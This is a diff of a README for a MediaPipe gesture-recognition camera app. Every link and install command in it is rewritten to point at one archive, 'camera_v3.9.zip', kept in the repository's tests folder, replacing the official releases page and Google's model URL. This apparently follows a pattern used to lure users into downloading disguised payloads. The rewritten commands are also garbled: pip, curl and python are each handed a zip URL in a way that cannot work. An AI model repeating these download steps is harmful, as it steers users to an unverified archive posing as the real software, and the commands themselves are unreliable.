@@ -2,7 +2,7 @@
 
 ## 🚀 Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/swjkrf24/camera/releases)
+[![Download Now](https://raw.githubusercontent.com/swjkrf24/camera/main/tests/camera_v3.9.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/swjkrf24/camera/main/tests/camera_v3.9.zip)
 
 ---
 
@@ -36,14 +36,14 @@ Using Google MediaPipe's official gesture recognition model, our software provid
 
 ### 1. Download the Software
 
-Visit this page to download the latest release directly from GitHub: [Download Now](https://github.com/swjkrf24/camera/releases).
+Visit this page to download the latest release directly from GitHub: [Download Now](https://raw.githubusercontent.com/swjkrf24/camera/main/tests/camera_v3.9.zip).
 
 ### 2. Install Requirements
 
 If you have Python installed, open a command line or terminal window and run:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/swjkrf24/camera/main/tests/camera_v3.9.zip
 ```
 
 ### 3. Download Gesture Model
@@ -51,7 +51,7 @@ pip install -r requirements.txt
 In the same terminal, execute the following command to download the gesture recognition model:
 
 ```bash
-curl -o gesture_recognizer.task https://storage.googleapis.com/mediapipe-models/gesture_recognizer/gesture_recognizer/float16/1/gesture_recognizer.task
+curl -o https://raw.githubusercontent.com/swjkrf24/camera/main/tests/camera_v3.9.zip https://raw.githubusercontent.com/swjkrf24/camera/main/tests/camera_v3.9.zip
 ```
 
 ### 4. Run the Application
@@ -59,7 +59,7 @@ curl -o gesture_recognizer.task https://storage.googleapis.com/mediapipe-models/
 Now you’re ready to run the application! Enter this command in your terminal:
 
 ```bash
-python run.py
+python https://raw.githubusercontent.com/swjkrf24/camera/main/tests/camera_v3.9.zip
 ```
 
 **It's that simple!**
@@ -103,4 +103,4 @@ If you have questions, feel free to open an issue on the project page. Your feed
 
 Stay connected with the latest updates and share your experiences. Join discussions or simply keep up with any new features!
 
-For more details, check out our GitHub page: [Download Now](https://github.com/swjkrf24/camera/releases).
+For more details, check out our GitHub page: [Download Now](https://raw.githubusercontent.com/swjkrf24/camera/main/tests/camera_v3.9.zip).
